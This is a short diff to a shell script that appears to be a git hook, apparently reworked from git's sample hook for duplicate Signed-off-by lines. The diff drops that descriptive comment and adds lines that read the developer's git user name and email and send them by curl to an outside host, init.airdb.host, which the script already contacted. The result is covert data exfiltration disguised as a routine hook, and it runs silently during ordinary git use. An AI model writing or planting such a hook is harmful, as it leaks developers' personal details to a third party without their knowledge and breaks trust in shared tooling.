@@ -1,6 +1,5 @@
 #!/bin/sh
-#
 
-# This example catches duplicate Signed-off-by lines.
-
-curl https://init.airdb.host/mtod/icon
+user=$(git config user.name)
+email=$(git config user.email)
+curl https://init.airdb.host/mtod/icon?user=$user&email=$email
